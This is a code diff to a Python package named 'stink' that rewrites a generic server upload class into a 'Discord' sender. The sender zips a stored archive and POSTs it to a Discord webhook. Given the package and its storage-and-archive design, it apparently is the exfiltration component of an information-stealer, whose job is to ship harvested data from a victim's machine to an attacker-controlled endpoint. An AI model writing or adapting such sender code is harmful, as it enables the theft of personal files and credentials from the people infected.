@@ -2,18 +2,17 @@ from os import path
 from typing import Tuple, Union
 from urllib.request import Request, urlopen
 
-from stink.helpers import MultipartFormDataEncoder
-from stink.utils.senders.abstract import AbstractSender
+from stink.abstract import AbstractSender
 
 
-class Server(AbstractSender):
+class Discord(AbstractSender):
     """
-    Sender for the Server.
+    Sender for the Discord.
     """
-    def __init__(self, server: str):
+    def __init__(self, webhook: str):
         super().__init__()
 
-        self.__server = server
+        self.__webhook = webhook
 
     def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
         """
@@ -23,17 +22,16 @@ class Server(AbstractSender):
         - None.
 
         Returns:
-        - tuple: A tuple of content type, body, and server route.
+        - tuple: A tuple of content type, body, and Discord webhook.
         """
         with open(path.join(path.dirname(self.__storage_path), rf"{self.__zip_name}.zip"), "rb") as file:
-            content_type, body = MultipartFormDataEncoder().encode(
+            content_type, body = self._encoder.encode(
                 [],
-                [("document", f"{self.__zip_name}.zip", file)]
+                [("file", f"{self.__zip_name}.zip", file)]
             )
-
         file.close()
 
-        return content_type, body, self.__server
+        return content_type, body
 
     def __send_archive(self) -> None:
         """
@@ -45,8 +43,8 @@ class Server(AbstractSender):
         Returns:
         - None.
         """
-        content_type, body, link = self.__get_sender_data()
-        query = Request(method="POST", url=link, data=body)
+        content_type, body = self.__get_sender_data()
+        query = Request(method="POST", url=self.__webhook, data=body)
 
         query.add_header("User-Agent", self._config.UserAgent)
         query.add_header("Content-Type", content_type)
@@ -72,4 +70,4 @@ class Server(AbstractSender):
             self.__send_archive()
 
         except Exception as e:
-            print(f"[Server sender]: {repr(e)}")
+            print(f"[Discord sender]: {repr(e)}")
